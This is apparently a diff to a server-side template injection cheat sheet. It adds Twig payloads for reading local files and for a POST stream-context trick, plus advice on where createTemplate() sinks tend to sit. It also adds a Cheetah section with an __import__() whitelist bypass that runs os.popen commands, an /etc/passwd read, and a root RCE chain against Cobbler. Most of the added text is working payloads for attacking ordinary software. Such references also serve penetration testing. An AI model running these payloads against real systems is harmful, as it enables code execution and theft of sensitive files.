@@ -423,6 +423,8 @@ ${object.getClass().getConstructors()}
 {{["id"]|filter("system")}}
 {{["cat /etc/passwd"]|filter("system")}}
 {{["id"]|map("system")|join}}
+{{["/etc/passwd"]|map("file_get_contents")|join}}     # LFI via map
+{{[{"http":{"method":"POST","header":"Content-Type: text/xml\r\n","content":body}}]|map("stream_context_set_default")}}  # Set POST context, then file_get_contents(url)
 ```
 
 ### Environment Access
@@ -431,6 +433,13 @@ ${object.getClass().getConstructors()}
 {{dump(_self)}}
 {{dump(_context)}}
 ```
+
+### `createTemplate()` Sink (direct input → template)
+When PHP code passes user input to `$twig->createTemplate($input)->render(...)`, the entire input is the template — unsandboxed by default even on Twig 3.x. Payloads execute without any context-breaking:
+```twig
+{{["id"]|map("system")|join}}
+```
+**Where to look:** `preview_*`, `render_*`, `email_template_*`, `banner_preview`, `template_test` endpoints. HTML-sanitized inputs (`htmlspecialchars`) still work if payload uses single quotes or no quotes.
 
 ---
 
@@ -508,6 +517,45 @@ $class.getClassLoader().loadClass("java.lang.Runtime")
 ```smarty
 {file_get_contents('/etc/passwd')}
 ```
+
+---
+
+## Cheetah (Python)
+
+Used by Cobbler, older Python web apps. Syntax is `#`-directive + `$var`, distinct from Jinja2/Tornado `{{}}`.
+
+### Basic Syntax
+```cheetah
+$var              # Output variable
+#set $x = 1       # Assignment
+#if $cond         # Conditional
+## comment
+```
+
+### Detection
+`{{7*7}}` returns literal `{{7*7}}`. Instead test:
+```cheetah
+#set $x = 7*7
+$x
+```
+If `49` renders, it's Cheetah (or similar `#`-directive engine).
+
+### Command Execution — `__import__()` Bypass
+Cheetah honors `cheetah_import_whitelist` for `#import` statements, but Python's `__import__()` builtin is NOT in that whitelist. When `os`/`subprocess` are blocked at the `#import` directive:
+```cheetah
+#set $os = __import__("os")
+#set $r = $os.popen("id").read()
+$r
+```
+
+### File Read
+```cheetah
+#set $f = open("/etc/passwd")
+$f.read()
+```
+
+### Why this matters (Cobbler)
+Cobbler renders kickstart/autoinstall templates via Cheetah as root. Injecting a template through the `write_autoinstall_template` XMLRPC then triggering `generate_autoinstall` yields root RCE. Whitelist is restrictive (`['random', 're', 'time', 'netaddr']`) but `__import__()` bypasses it trivially.
 
 ---
 
@@ -981,6 +1029,7 @@ Exploit: theme}}<%= `whoami` %>{{
 | Twig | PHP | `{{}}` | `{% %}` | `system()` |
 | Smarty | PHP | `{}` | `{php}` | `system()` |
 | Velocity | Java | `$` | `#` | `Runtime.exec()` |
+| Cheetah | Python | `$var` | `#directive` | `__import__("os").popen()` |
 
 ---
 
